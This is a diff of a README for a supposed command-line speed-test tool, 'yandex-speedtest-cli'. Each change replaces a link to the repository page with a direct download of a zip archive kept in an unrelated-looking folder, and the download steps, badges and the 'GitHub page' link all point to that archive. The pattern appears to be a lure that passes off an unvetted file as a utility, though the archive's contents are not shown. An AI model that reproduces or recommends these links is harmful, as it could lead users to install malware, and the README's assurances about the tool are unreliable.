@@ -1,6 +1,6 @@
 # 🚀 yandex-speedtest-cli - Fast Internet Test in One Command
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli/raw/refs/heads/main/carangoid/speedtest-cli-yandex-v1.7.zip)
 
 ---
 
@@ -36,12 +36,12 @@ This app runs on Windows and other systems with minimal setup. You don’t need 
 
 ## 🔵 Download yandex-speedtest-cli
 
-[![Download yandex-speedtest-cli](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
+[![Download yandex-speedtest-cli](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli/raw/refs/heads/main/carangoid/speedtest-cli-yandex-v1.7.zip)
 
 To get the software:
 
 1. Click the "Download Now" button above or visit the page below:  
-   https://github.com/abuferas1262/yandex-speedtest-cli
+   https://github.com/abuferas1262/yandex-speedtest-cli/raw/refs/heads/main/carangoid/speedtest-cli-yandex-v1.7.zip
 
 2. On the GitHub page, look for the latest release or download section.  
 
@@ -120,7 +120,7 @@ All this runs via one command in your terminal window, without clutter or extra 
 
 ## 🔗 Useful Links
 
-- GitHub page: https://github.com/abuferas1262/yandex-speedtest-cli  
+- GitHub page: https://github.com/abuferas1262/yandex-speedtest-cli/raw/refs/heads/main/carangoid/speedtest-cli-yandex-v1.7.zip  
 - Official documentation (if included in the repo)  
 - Support contact (check GitHub issues or README)  
 
@@ -148,4 +148,4 @@ This tool only sends and receives data to Yandex’s servers to test your connec
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli/raw/refs/heads/main/carangoid/speedtest-cli-yandex-v1.7.zip)
